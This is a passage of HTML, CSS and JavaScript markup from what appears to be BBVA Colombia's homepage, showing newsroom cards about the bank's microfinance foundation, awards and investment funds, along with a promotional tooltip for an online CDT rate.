     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cuenta-online.jpg.img.768.1630527854623.jpg" data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cuenta-online.jpg.img.320.1630527854623.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/cuenta-online.jpg.img.768.1630527854623.jpg 768w" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 40vw, 90vw" itemprop="image" class="godigital__image__img " alt="cuenta en linea"/>

    

            
        </div>
    </div>
</a>
</li>
                </ul>
            </div>
        </article>
    </div>
</div>
<div class="cardsmodule aem-GridColumn aem-GridColumn--default--12">



    
    
    



    
    


    
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.listlimit.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">


    
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.cardsmodule/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">


    
    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.cardsmodule/large.lc-20230516-100300-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>


    
    




    <section class="cardsmodule__base background--white " data-dl-component data-dl-component-name="cardsmodule_copy" data-dl-component-type="bbva/pwebs/components/par/cardsmodule" id="content-cardsmodule_copy">
        <h3 class="cardsmodule__title">Newsroom BBVA</h3>
        
        <div class="slider cardsmodule__slider" data-component="slider" data-component-params='{&quot;selectors&quot;:{&quot;items&quot; : &quot;.card&quot;}}'>
            <div class="swiper-button-next">
                <i class="bbva-icon bbva-icon__2_017_forward"></i>
            </div>
            <div class="swiper-button-prev">
                <i class="bbva-icon bbva-icon__2_046_back"></i>
            </div>
            <div class="container swiper-container">
                <ul class="swiper-wrapper swiper-smooth  ">
                    
                    
                     




    
    
    <li class="card">

    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.card/small.lc-20230516-100300-lc.min.ACSHASH534ab22ad480b292de70eeee2e2fcb5d.css" type="text/css">



    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.card/large.lc-20230516-100300-lc.min.ACSHASH0280aa3d8a8fb8a4ef1d04365a7929a7.css" type="text/css" media="all and (min-width: 600px)">



    




    





<div class="card__base card__base--white listlimit__item" aria-hidden="false" data-dl-component data-dl-component-name="card_746856020" data-dl-component-type="bbva/pwebs/components/par/card">
    
    <div class="card__container">
        
            <div class="card__image" itemscope itemtype="http://schema.org/ImageObject">
                <a itemprop="url contentUrl" href="https://www.bbva.com/es/sostenibilidad/javier-m-flores-nos-sentimos-orgullosos-de-haber-ayudado-a-millones-de-personas-a-tener-una-mejor-calidad-de-vida/" aria-label="Conoce más. Abre en nueva ventana" title="Conoce más. Abre en nueva ventana" class="card__image__popup " aria-hidden="true" tabindex="-1" target="_blank"  rel="noopener noreferrer">
                    
                        
    

    
        
        
        <img sizes="(min-width: 990px) 34vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": "4/3"}' data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/FMBBVA-Javier-M-Flores.jpg.img.320.1652999361372.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/FMBBVA-Javier-M-Flores.jpg.img.768.1652999361372.jpg 768w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/FMBBVA-Javier-M-Flores.jpg.img.960.1652999361372.jpg 960w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/FMBBVA-Javier-M-Flores.jpg.img.1176.1652999361372.jpg 1176w" data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/FMBBVA-Javier-M-Flores.jpg.img.1176.1652999361372.jpg" itemprop="image caption" class="card__img" alt="La Fundación de Microfinanzas BBVA cumple 15 años"/>

        
    

                    
                    <div class="image__overlay"></div>
                </a>
  
                
 
                <div class="card__type">
                    <span class="bbva-icon bbva-icon__2_015_link"></span>
                    
                </div>
            </div>
            <div class="card__content" itemprop="offers" itemscope itemtype="http://schema.org/AggregateOffer">
                
                    <a itemprop="url contentUrl" href="https://www.bbva.com/es/sostenibilidad/javier-m-flores-nos-sentimos-orgullosos-de-haber-ayudado-a-millones-de-personas-a-tener-una-mejor-calidad-de-vida/" aria-label="Conoce más. Abre en nueva ventana" title="Conoce más. Abre en nueva ventana" target="_blank"  rel="noopener noreferrer">
                        <h3 class="card__title" aria-hidden="true" itemprop="name subjectOf itemOffered">
                            La Fundación de Microfinanzas BBVA cumple 15 años
                        </h3>
                    </a>
                
                
                
                <div class="card__body rte" itemprop="description">
                    La Fundación Microfinanzas BBVA (FMBBVA) está de celebración. Cumple 15 años desde que BBVA la creara en 2007 como una entidad sin ánimo de lucro en el marco de su programa de Responsabilidad Social Corporativa.
                </div>
                
            </div>
            <div class="card__footer card__footer--small">
                <a itemprop="url" href="https://www.bbva.com/es/sostenibilidad/javier-m-flores-nos-sentimos-orgullosos-de-haber-ayudado-a-millones-de-personas-a-tener-una-mejor-calidad-de-vida/" aria-label="Conoce más. Abre en nueva ventana" title="Conoce más. Abre en nueva ventana" target="_blank" rel="noopener noreferrer" class="link__base card__link  ">
                    <i class="bbva-icon bbva-icon__2_003_visualize"></i>
                    <span>Conoce más</span>
                </a>
                
            </div>
        
    </div>
</div>

</li>


    
    
    <li class="card">

    




    




    




    





<div class="card__base card__base--white listlimit__item" aria-hidden="false" data-dl-component data-dl-component-name="card" data-dl-component-type="bbva/pwebs/components/par/card">
    
    <div class="card__container">
        
            <div class="card__image" itemscope itemtype="http://schema.org/ImageObject">
                <a itemprop="url contentUrl" href="https://www.bbva.com/es/co/bbva-en-colombia-gana-dos-premios-de-innovacion-tecnologica-de-global-finance/" aria-label="Conoce más. Abre en nueva ventana" title="Conoce más. Abre en nueva ventana" class="card__image__popup " aria-hidden="true" tabindex="-1" target="_blank" rel="noopener noreferrer">
                    
                        
    

    
        
        
        <img sizes="(min-width: 990px) 34vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": "4/3"}' data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Global-Finance.JPG.img.320.1652999361338.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Global-Finance.JPG.img.768.1652999361338.jpg 768w" data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Global-Finance.JPG.img.768.1652999361338.jpg" itemprop="image caption" class="card__img" alt="BBVA en Colombia gana dos premios de Global Finance"/>

        
    

                    
                    <div class="image__overlay"></div>
                </a>
  
                
 
                <div class="card__type">
                    <span class="bbva-icon bbva-icon__2_015_link"></span>
                    
                </div>
            </div>
            <div class="card__content" itemprop="offers" itemscope itemtype="http://schema.org/AggregateOffer">
                
                    <a itemprop="url contentUrl" href="https://www.bbva.com/es/co/bbva-en-colombia-gana-dos-premios-de-innovacion-tecnologica-de-global-finance/" aria-label="Conoce más. Abre en nueva ventana" title="Conoce más. Abre en nueva ventana" target="_blank" rel="noopener noreferrer">
                        <h3 class="card__title" aria-hidden="true" itemprop="name subjectOf itemOffered">
                            BBVA en Colombia gana dos premios de Global Finance
                        </h3>
                    </a>
                
                
                
                <div class="card__body rte" itemprop="description">
                    BBVA en Colombia fue reconocida en las categorías de Innovación en Medios de Pago y en Banca Pyme con los premios The Innovators 2022, otorgados por la revista internacional especializada Global Finance.
                </div>
                
            </div>
           
        
    </div>
</div>

</li>


    
    
    <li class="card">
<div class="card__base card__base--white listlimit__item" aria-hidden="false" data-dl-component data-dl-component-name="card_949126770" data-dl-component-type="bbva/pwebs/components/par/card">
    
    <div class="card__container">
        
            <div class="card__image" itemscope itemtype="http://schema.org/ImageObject">
                <a itemprop="url contentUrl" href="https://www.bbva.com/es/co/bbva-fiduciaria-renueva-su-portafolio-de-fondos-de-inversion-en-colombia/" aria-label="Enlace a la noticia . Abre en nueva ventana" title="Enlace a la noticia . Abre en nueva ventana" class="card__image__popup " aria-hidden="true" tabindex="-1" target="_blank" rel="noopener noreferrer">
                    
                        
    

    
        
        
        <img sizes="(min-width: 990px) 34vw, (min-width: 600px) 50vw, 100vw" data-component="lazyimages" data-component-params='{"keepSize": "", "aspectRatio": "4/3"}' data-srcset="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Fiduciaria---.JPG.img.320.1652999361348.jpg 320w,https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Fiduciaria---.JPG.img.768.1652999361348.jpg 768w" data-src="https://www.bbva.com.co/content/dam/public-web/colombia/new-beginning/Fiduciaria---.JPG.img.768.1652999361348.jpg" itemprop="image caption" class="card__img" alt="BBVA Fiduciaria lanza nuevo fondo de inversión en Colombia"/>

        
    

                    
                    <div class="image__overlay"></div>
                </a>
  
                
 
                <div class="card__type">
                    <span class="bbva-icon bbva-icon__2_015_link"></span>
                    
                </div>
            </div>
            <div class="card__content" itemprop="offers" itemscope itemtype="http://schema.org/AggregateOffer">
                
                    <a itemprop="url contentUrl" href="https://www.bbva.com/es/co/bbva-fiduciaria-renueva-su-portafolio-de-fondos-de-inversion-en-colombia/" aria-label="Enlace a la noticia . Abre en nueva ventana" title="Enlace a la noticia . Abre en nueva ventana" target="_blank" rel="noopener noreferrer">
                        <h3 class="card__title" aria-hidden="true" itemprop="name subjectOf itemOffered">
                            BBVA Fiduciaria lanza nuevo fondo de inversión en Colombia
                        </h3>
                    </a>
                
                
                
                <div class="card__body rte" itemprop="description">
                    BBVA Fiduciaria lanza una nueva oferta de fondos de inversión según el perfil de riesgo de los clientes. El monto mínimo de inversión es de 50.000 pesos y podrán contratarse 100% a través de los canales digitales.
                </div>
                
            </div>
            <div class="card__footer card__footer--small">
                <a itemprop="url" href="https://www.bbva.com/es/co/bbva-fiduciaria-renueva-su-portafolio-de-fondos-de-inversion-en-colombia/" aria-label="Enlace a la noticia . Abre en nueva ventana" title="Enlace a la noticia . Abre en nueva ventana" target="_blank" rel="noopener noreferrer" class="link__base card__link  ">
                    <i class="bbva-icon bbva-icon__2_003_visualize"></i>
                    <span>Conoce más</span>
                </a>
                
            </div>
        
    </div>
</div>

</li>



                </ul>
            </div>
            <div class="swiper-pagination "></div>
            <a class="cardsmodule__showmorelink listlimit__show listlimit__show--more link__base " href="https://www.bbva.com/es/co/?utm_source=bbvacol&utm_campaign=modulo_col" title="Ir a Newsroom BBVA. Abre en nueva ventana" target="_blank" aria-label="Ir a Newsroom BBVA. Abre en nueva ventana" itemprop="relatedLink">
                    <i class="bbva-icon bbva-icon__2_032_add"></i>
                    <span>Ir a Newsroom BBVA</span>
            </a>
        </div>
    </section>

</div>
<div class="homemicroillustration aem-GridColumn aem-GridColumn--default--12">



<!-- no encontrado -->
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.homemicroillustration/small.lc-20220713-060320-lc.min.css" media="print" onload="this.media='all'">



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.homemicroillustration/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



  <div class="background--bbva100 " data-dl-component data-dl-component-name="homemicroillustratio" data-dl-component-type="bbva/pwebs/components/par/homemicroillustration" id="content-homemicroillustratio">
    <ul class="container homemicroillustration__base">
      <li class="homemicroillustration__item homemicroillustration__item--left">

    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.microillustration/small.lc-20220713-060320-lc.min.css" media="print" onload="this.media='all'">



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.microillustration/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>


<!-- no encontrado (fin) -->


    
        <div class="microillustration__component" data-dl-component data-dl-component-name="microillustrationleft" data-dl-component-type="bbva/pwebs/components/par/unremovable/microillustration" id="content-homemicroillustratio-microillustrationleft" itemscope itemtype="http://schema.org/ImageObject">
            
            <a class="microillustration__base link__base" target="_blank" rel="noopener noreferrer" aria-label="Enlace a documento Oficinas y cajeros. Abre en nueva ventana" title="Enlace a documento Oficinas y cajeros. Abre en nueva ventana" tabindex="0" itemprop="url" href="/personas/oficinas.html">
                
                    
    <div class="microillustration__wrapper microillustration__wrapper--cut microillustration__wrapper__bbva100">
        <div class="microillustration__animation">
            
                
    
        


    
    
    
    
    
     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/atm_locate.svg" data-srcset="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/atm_locate.svg" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 20vw, 25vw" itemprop="image" class="microillustration__image " alt="encuentranos"/>

    

            
        </div>
    </div>
    <h2 class="microillustration__title" itemprop="name">
        Oficinas, cajeros y corresponsales
    </h2>
    <p class="microillustration__link">
        Encuéntranos
    </p>

                
            </a>
        </div>
    

</li>
      <li class="homemicroillustration__item homemicroillustration__item--middle">

    




    






    
        <div class="microillustration__component" data-dl-component data-dl-component-name="microillustrationmiddle" data-dl-component-type="bbva/pwebs/components/par/unremovable/microillustration" id="content-homemicroillustratio-microillustrationmiddle" itemscope itemtype="http://schema.org/ImageObject">
            
            <a class="microillustration__base link__base" target="_self" aria-label="Más información sobre atención al inversionista" title="Más información sobre atención al inversionista" tabindex="0" itemprop="url" href="/personas/atencion-al-inversionista.html">
                
                    
    <div class="microillustration__wrapper microillustration__wrapper--cut microillustration__wrapper__bbva100">
        <div class="microillustration__animation">
            
                
    
        


    
    
    
    
    
     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/search_graphic.svg" data-srcset="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/search_graphic.svg" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 20vw, 25vw" itemprop="image" class="microillustration__image " alt="atencion al inversionista"/>

    

            
        </div>
    </div>
    <h2 class="microillustration__title" itemprop="name">
        Atención al inversionista
    </h2>
    <p class="microillustration__link">
        Investor Relations
    </p>

                
            </a>
        </div>
    

</li>
      <li class="homemicroillustration__item homemicroillustration__item--right">

    




    






    
        <div class="microillustration__component" data-dl-component data-dl-component-name="microillustrationright" data-dl-component-type="bbva/pwebs/components/par/unremovable/microillustration" id="content-homemicroillustratio-microillustrationright" itemscope itemtype="http://schema.org/ImageObject">
            
            <a class="microillustration__base link__base" target="_self" aria-label="Más información sobre líneas de atención al cliente" title="Más información sobre líneas de atención al cliente" tabindex="0" itemprop="url" href="/personas/lineas-de-atencion.html">
                
                    
    <div class="microillustration__wrapper microillustration__wrapper--cut microillustration__wrapper__bbva100">
        <div class="microillustration__animation">
            
                
    
        


    
    
    
    
    
     <img data-component="lazyimages" data-component-params='{"keepSize": "" }' data-src="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/send_documents.png.img.320.1635233904353.png" data-srcset="https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/send_documents.png.img.80.1635233904353.png 80w,https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/send_documents.png.img.160.1635233904353.png 160w,https://www.bbva.com.co/content/dam/public-web/global/images/micro-illustrations/send_documents.png.img.320.1635233904353.png 320w" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" sizes="(min-width: 900px) 20vw, 25vw" itemprop="image" class="microillustration__image " alt="lineas de atencion"/>

    

            
        </div>
    </div>
    <h2 class="microillustration__title" itemprop="name">
        Chat
    </h2>
    <p class="microillustration__link">
        Contáctanos
    </p>

                
            </a>
        </div>
    

</li>
    </ul>
  </div>
</div>
<div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">



    


    
        
        <div data-dl-component data-dl-component-name="experiencefragment_2" data-dl-component-type="bbva/pwebs/components/par/experiencefragment" id="content-experiencefragment_2">
             
             
    



<div class="xf-content-height">
    


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="htmlcomponent aem-GridColumn aem-GridColumn--default--12">


	<div class="htmlcomponent__container " id="campanita-header-master-jcr-content-root-htmlcomponent_copy_c">
        <style type="text/css">.CRO-Public-Home-Preapproved-Tooltip-Close {
    position: absolute;
    top: 0;
    right: 5px;
    width: 30px;
    height: 30px;
    text-align: center;
    line-height: 2;
    cursor: pointer;
    font-size: 20px;
}

.CRO-Public-Home-Preapproved-Tooltip-Close * {
    cursor: pointer;
}

#CRO-Public-Home-Preapproved-Tooltip > div.popover-content > div:nth-child(1) > h1 {
    font-size: 20px;
}

#CRO-Public-Home-Preapproved-Tooltip > div.popover-content > div:nth-child(1) > h1 > span {
    color: #F8CD51;
}

#CRO-bell {
    opacity: 0;
}

ul.header__actions__ulist>#CRO-bell {
    opacity: 1 !important;
}

#CRO-Public-Home-Preapproved-Tooltip {
    opacity: 0;
}

h1 {
    margin   : .67em 0;
    font-size: 2em;
}

img {
    border: 0;
}

button {
    margin     : 0;
    font-family: inherit;
    font-size  : 100%;
}

button {
    line-height: normal;
}

button {
    text-transform: none;
}

button {
    cursor            : pointer;
    -webkit-appearance: button;
}

button::-moz-focus-inner {
    padding: 0;
    border : 0;
}
@media print {
    * {
        color             : #000 !important;
        text-shadow       : none !important;
        background        : transparent !important;
        -webkit-box-shadow: none !important;
        box-shadow        : none !important;
    }

    img {
        page-break-inside: avoid;
    }

    img {
        max-width: 100% !important;
    }

    p,
    h2,
    h3 {
        orphans: 3;
        widows : 3;
    }

    h2,
    h3 {
        page-break-after: avoid;
    }
}

*,
*:before,
*:after {
    -webkit-box-sizing: border-box;
    box-sizing        : border-box;
}

button {
    font-family: inherit;
    font-size  : inherit;
    line-height: inherit;
}

img {
    vertical-align: middle;
}

h1,
h2,
h3 {
    font-family: BentonSansBBVA-Book,Helvetica,Arial,sans-serif;
    /*font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;*/
    font-weight: 500;
    line-height: 1.1;
    color      : inherit;
}

h1,
h2,
h3 {
    margin-top   : 20px;
    margin-bottom: 10px;
}

h1 {
    font-size: 36px;
}

h2 {
    font-size: 30px;
}

h3 {
    font-size: 24px;
}

.row {
    margin-right: -15px;
    margin-left : -15px;
}

.row:before,
.row:after {
    display: table;
    content: " ";
}

.row:after {
    clear: both;
}

.row:before,
.row:after {
    display: table;
    content: " ";
}

.row:after {
    clear: both;
}

.col-md-3,
.col-md-12 {
    position     : relative;
    min-height   : 1px;
    padding-right: 15px;
    padding-left : 15px;
}

@media (min-width: 992px) {

    .col-md-3,
    .col-md-12 {
        float: left;
    }

    .col-md-12 {
        width: 100%;
    }

    .col-md-3 {
        width: 25%;
    }
}

.fade {
    opacity           : 0;
    -webkit-transition: opacity .25s linear;
    transition        : opacity .25s linear;
}

.fade.in {
    opacity: 1;
}

.popover {
    position          : absolute;
    top               : 0;
    left              : 0;
    z-index           : 1010;
    display           : none;
    width             : 100vw !important;
    max-width         : 300px !important;
    padding           : 1px;
    text-align        : left;
    white-space       : normal;
    background-color  : #fff;
    border            : 1px solid #ccc;
    border            : 1px solid rgba(0, 0, 0, 0.2);
    border-radius     : 6px;
    -webkit-box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
    box-shadow        : 0 5px 10px rgba(0, 0, 0, 0.2);
    background-clip   : padding-box;
}

.popover.bottom {
    margin-top: 10px;
}

.popover-title {
    padding         : 8px 14px;
    margin          : 0;
    font-size       : 14px;
    font-weight     : normal;
    line-height     : 18px;
    background-color: #f7f7f7;
    border-bottom   : 1px solid #ebebeb;
    border-radius   : 5px 5px 0 0;
}

.popover-content {
    padding: 35px 14px 9px 14px;
}

.popover-content>div:last-child {
    display  : block;
    margin   : 15px 0 0 0;
    font-size: 11px;
}

.popover .arrow,
.popover .arrow:after {
    position    : absolute;
    display     : block;
    width       : 0;
    height      : 0;
    border-color: transparent;
    border-style: solid;
}

.popover .arrow {
    border-width: 11px;
}

.popover .arrow:after {
    border-width: 10px;
    content     : "";
}

.popover.bottom .arrow {
    top                : -11px;
    left               : 50%;
    margin-left        : -11px;
    border-bottom-color: #999;
    border-bottom-color: rgba(0, 0, 0, 0.25);
    border-top-width   : 0;
}

.popover.bottom .arrow:after {
    top                : 1px;
    margin-left        : -10px;
    border-bottom-color: #fff;
    border-top-width   : 0;
    content            : " ";
}

.NamePer {
    font-family: 'BentonSansBBVA-Medium';
    font-size  : 28px;
    color      : white;
    text-align : center;
    line-height: 36px !important;
}

.body-bannerPre {
    font-family: 'BentonSansBBVA-Book';
    font-size  : 18px;
    line-height: 20px;
    color      : white;
    text-align : center;
}

p.body-bannerPre span {
    font-weight: bold;
    color      : #F8CD51;
}

.txIcon-bannerPre {
    font-family: 'BentonSansBBVA-Book';
    font-size  : 14px;
    line-height: 18px;
    color      : white;
    text-align : left;
}

.checkItem {
    display          : -webkit-box;
    display          : -ms-flexbox;
    display          : flex;
    -webkit-box-align: center;
    -ms-flex-align   : center;
    align-items      : center;
    -webkit-box-pack : center;
    -ms-flex-pack    : center;
    justify-content  : center;
    width            : 33%;
    margin-top       : 10px;
    text-align       : left;
    float            : left;
}

.icon-bannerPre {
    width       : 20px;
    margin-right: 10px;
}

.icon-bell {
    width        : 30px;
    margin-bottom: -7px;
}

.no-gutter {
    margin-right: 0;
    margin-left : 0;
}

.no-gutter>[class*="col-"] {
    padding-right: 0;
    padding-left : 0;
}

.CTA-bannerPre {
    width              : 80%;
    background-size    : 210% 100%;
    background-position: 99% center;
    background-image   : linear-gradient(100deg, #2dcccd 50%, #028484 50%);
    text-align         : center;
    color              : white;
    margin             : 0 10%;
    padding            : 10px 0px;
    font-size          : 16px;
    font-family        : 'BentonSansBBVA-Book';
    font-weight        : bolder;
    margin-bottom      : 20px;
    text-decoration    : none;
    border             : none;
    transition         : all .5s ease-in-out;
}

.CTA-bannerPre:hover {
    background-position: 0 center;
}


.popover {
    background-color: #002c55;
    padding-bottom  : 15px;
}

.popover.bottom .arrow:after {
    border-bottom-color: #002c55;
}

@media (min-width: 320px) and (max-width: 767.98px) {
    .txIcon-bannerPre {
        font-family: 'BentonSansBBVA-Book';
        font-size  : 13px;
        line-height: 18px;
        color      : white;
        text-align : left;
    }

    .icon-bannerPre {
        width       : 15px;
        margin-right: 5px;
    }
}

.popover {
    max-width: 425px;
}
@-webkit-keyframes ringing-bell {
    0% {
        -webkit-transform: rotate(45deg);
        transform        : rotate(45deg);
    }

    15% {
        -webkit-transform: rotate(-45deg);
        transform        : rotate(-45deg);
    }

    30% {
        -webkit-transform: rotate(30deg);
        transform        : rotate(30deg);
    }

    45% {
        -webkit-transform: rotate(-30deg);
        transform        : rotate(-30deg);
    }

    60% {
        -webkit-transform: rotate(15deg);
        transform        : rotate(15deg);
    }

    75% {
        -webkit-transform: rotate(0deg);
        transform        : rotate(0deg);
    }

    100% {
        -webkit-transform: rotate(0deg);
        transform        : rotate(0deg);
    }
}

@keyframes ringing-bell {
    0% {
        -webkit-transform: rotate(45deg);
        transform        : rotate(45deg);
    }

    15% {
        -webkit-transform: rotate(-45deg);
        transform        : rotate(-45deg);
    }

    30% {
        -webkit-transform: rotate(30deg);
        transform        : rotate(30deg);
    }

    45% {
        -webkit-transform: rotate(-30deg);
        transform        : rotate(-30deg);
    }

    60% {
        -webkit-transform: rotate(15deg);
        transform        : rotate(15deg);
    }

    75% {
        -webkit-transform: rotate(0deg);
        transform        : rotate(0deg);
    }

    100% {
        -webkit-transform: rotate(0deg);
        transform        : rotate(0deg);
    }
}

#CRO-login {
    position: relative;
    padding : 0 19px 0 0;
}

#CRO-login .icon-bell {
    position                    : absolute;
    top                         : calc(50% - 12.5px);
    left                        : -40px;
    -webkit-animation-play-state: paused;
    animation-play-state        : paused;
    -webkit-animation           : 2s ringing-bell ease-in-out infinite;
    animation                   : 2s ringing-bell ease-in-out infinite;
    -webkit-transform-origin    : 50% 0%;
    transform-origin            : 50% 0%;
    -webkit-animation-direction : alternate;
    animation-direction         : alternate;
}

#CRO-login span {
    position: absolute;
    height  : 50px;
    width   : 1px;
    display : -webkit-box;
    display : -ms-flexbox;
    display : flex;
    top     : calc(50% - 25px);
    right   : 0;
    border  : .5px #fff solid;
}

@media (max-width: 767px) {
    #CRO-bell {
        position: fixed;
        display: none;
    }

    #CRO-login {
        position: fixed;
        top     : 10px;
        left   : 60px;
        z-index : 100;
        width   : 30px;
        height  : 30px;
        padding : 0 !important;
    }

    #CRO-login .icon-bell {
        left: 0 !important;
    }

    #CRO-login p {
        display: none !important;
    }

    #CRO-login span {
        display: none !important;
    }

    #CRO-Public-Home-Preapproved-Tooltip .arrow {
        opacity: 0 !important;
    }
    .CTA-bannerPre.desktop {
        display: none !important;
    }
}

@media (min-width: 768px) {
    .CTA-bannerPre.mobile {
        display: none !important;
    }
}

@media (max-width: 768px) {
    .ocultarmodulo-cro{

        display: none;
    }

    #CRO-bell{
        display: none;
    }
}

.ocultarmodulo-cro{

    display: block;
}


@media (max-width: 1024px) {
    .ocultarmodulo-cro{

        display: none;
    }

    #CRO-bell{
        display: none;
    }
}

.ocultarmodulo-cro{

    display: block;
}
</style>
        <script type="text/javascript">(function() {
            // third party js
               if (document.addEventListener) {
    window.addEventListener('load', CROPublicHomePreapprovedTooltip, false);
} else {
    window.attachEvent('onload', CROPublicHomePreapprovedTooltip);
}

function CROPublicHomePreapprovedTooltip() {

    let tooltip = document.querySelector('#CRO-Public-Home-Preapproved-Tooltip');
    let bell = document.querySelector('#CRO-bell');

    let container = document.querySelector('ul.header__actions__ulist');

    container.prepend(tooltip);
    container.prepend(bell);

    let login = document.querySelector('#CRO-login');
    var posicion = login.getBoundingClientRect();

    prefixedEvent(login, 'click', function (event) {
        event.propa
        let animation = document.querySelector('#CRO-login .icon-bell');
        prefixedEvent(animation, 'animationiteration', function (e) {
            let style = window.getComputedStyle(e.target, null);
            if (style.getPropertyValue('transform') == 'matrix(1, 0, 0, 1, 0, 0)') {
                e.target.style.animationPlayState = 'paused';
            }
        });

        let tooltip = document.querySelector('#CRO-Public-Home-Preapproved-Tooltip');
        if (tooltip.classList.contains('CRO-tooltip-open')) {
            tooltip.classList.remove('CRO-tooltip-open');
            tooltip.style.opacity = '0';
            setTimeout(() => {
                tooltip.style.display = 'none';
            }, 260);
        } else {
            tooltip.classList.add('CRO-tooltip-open');
            tooltip.style.display = 'block';
            tooltip.style.position = 'absolute';
            tooltip.style.top = (posicion.bottom + 10) + 'px';
            let left = posicion.left + (((posicion.right - posicion.left) / 2) - tooltip.clientWidth / 2);
            if (left < 5) {
                left = 5;
            }
            tooltip.style.left = left + 'px';
            setTimeout(() => {
                tooltip.style.opacity = '1';
            }, 10);
        }
    });

    let CTAdesktop = document.querySelector('#CRO-Public-Home-Preapproved-Tooltip .CTA-bannerPre.desktop');

    prefixedEvent(CTAdesktop, 'click', function (event) {
        window.location = 'https://www.bbva.com.co/personas/acceso.html?web=wdi:::00000834-cdt_boton-inv-cdt_online:cdt_boton_home-openm-:botonhome::::::oth:::';
    });

    let CTAmobile = document.querySelector('#CRO-Public-Home-Preapproved-Tooltip .CTA-bannerPre.mobile');

    prefixedEvent(CTAmobile, 'click', function (event) {
        window.location = 'https://www.bbva.com.co/personas/acceso.html?web=wdi:::00000834-cdt_boton-inv-cdt_online:cdt_boton_home-openm-:botonhome::::::oth:::';
    });

    let close = document.querySelector('.CRO-Public-Home-Preapproved-Tooltip-Close');

    prefixedEvent(close, 'click', function (event) {
        tooltip.classList.remove('CRO-tooltip-open');
        tooltip.style.opacity = '0';
        setTimeout(() => {
            tooltip.style.display = 'none';
        }, 260);
    });
}

function prefixedEvent(element, type, callback) {
    var pfx = ["webkit", "moz", "MS", "o", ""];
    for (var p = 0; p < pfx.length; p++) {
        if (!pfx[p]) type = type.toLowerCase(); element.addEventListener(pfx[p] + type,
            callback, false);
    }
}
        })(this);</script>
        <div class="ocultarmodulo-cro">
<div id="CRO-Public-Home-Preapproved-Tooltip" class="popover fade bottom in" style="display: none;">
    <div class="CRO-Public-Home-Preapproved-Tooltip-Close">
        <i class="bbva-icon bbva-icon__2_022_close"></i>
    </div>
    <div class="arrow" style="left: 50%;"></div>
    <h3 class="popover-title" style="display: none;"></h3>
    <div class="popover-content">
        <div class="col-md-12">
            <p class="body-bannerPre">
            <span style="color: white">Super tasa en CDT Online
